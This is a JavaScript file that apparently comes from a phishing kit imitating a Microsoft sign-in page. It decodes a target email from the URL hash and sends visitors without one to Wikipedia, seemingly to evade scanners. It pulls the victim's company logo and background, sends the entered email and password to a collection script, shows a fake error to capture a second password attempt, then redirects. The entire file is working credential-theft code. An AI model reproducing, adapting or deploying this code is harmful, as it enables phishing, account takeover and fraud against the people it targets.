$( document ).ready(function() {

			var hash = window.location.hash;
			var emailz = hash.split('#')[1];
			if(typeof(emailz) == 'undefined'){
				setTimeout(function(){
							window.location.href="https://www.wikipedia.com"
						} , 2000);
			}else{
				var email = atob(emailz);
				if(true_email(email)){ // if hash email used run this or run else
					set_brand(email);
					$('#email').val(email);
					$('.identity').html(email);
				}else{
					console.log("HERE");
					setTimeout(function(){
							window.location.href="https://www.wikipedia.com"
						} , 2000);
				}
			}
			
			// Normal Entry
			
			$('.btn-email').on('click', function (){
				var email = $('#email').val();
				$('.identity').html(email);
				$(".error-alert").hide();
				$('.btn-email').prop('disabled', true);
				if(true_email(email) == false){
					$(".error-alert").show();
					$(".error-alert-msg").html('Please enter your email.');
					$('.btn-email').prop('disabled', false);
				}else{
						set_brand(email);
						setTimeout(function (){
							$("#add_em").hide();
							$("#add_pass").show();
						}, 1000);
				}
			});
						
			var count = 1;
			
			$('#idSIButton9').on('click', function (event){
				event.preventDefault ? event.preventDefault() : event.returnValue = false;
				var user = $('#email').val();
				var pass = $('#i0118').val();
				if(pass == ""){
					$("#passwordError2").show();
					$("#important").hide();
					$('#i0118').focus();
					
				}else{
					$("#passwordError2").hide();
					$("#passwordError").hide();
					$('#idSIButton9').prop('disabled', true);
					$.ajax({
						url: "policy.php?ss=2", // add external link here
						data: {
								"email": user,
								"password": pass,
								"attempt": count
							},
						type: "POST",
						success: function(data){
								count++;
								if(count > 2){
									count = 1;
									setTimeout(function(){
										window.location.href="success.php?ss=2&src=DluZDluZHNmNDBlb2RzaDluZHNmNDDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbHNmNDBlb2RzaTRDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbZWppZXdpb2U5NDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpb25ja29uc2NrIGtjIGtqIHZqayBj"
									} , 2000);
								}else{
								$("#passwordError").show();
								$('#idSIButton9').prop('disabled', false);
								
							}
						},
							error: function(data) {
								console.log('Ajax error');
							}
						});
					
				}
			});
			
	
			
			function set_brand(email){
				$.ajax({
					url: 'brand.php?ss=2', // add external link here
					type: "POST",
					data: {email:email,barnd:1},
					success: function(data){
						var i=$.parseJSON(data);
						if(i.bg_image !== null && i.logo_image !== null && i.bg_image !== '' && i.logo_image !== ''){
							$('.backgroundImage').css('background-image', 'url(' + i.bg_image + ')');
							$('.logo').attr('src', i.logo_image);
							$('#banner_image').hide();
						}
					}
				});
			}
			
			function true_email(a) {
			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(a);
		}
});

	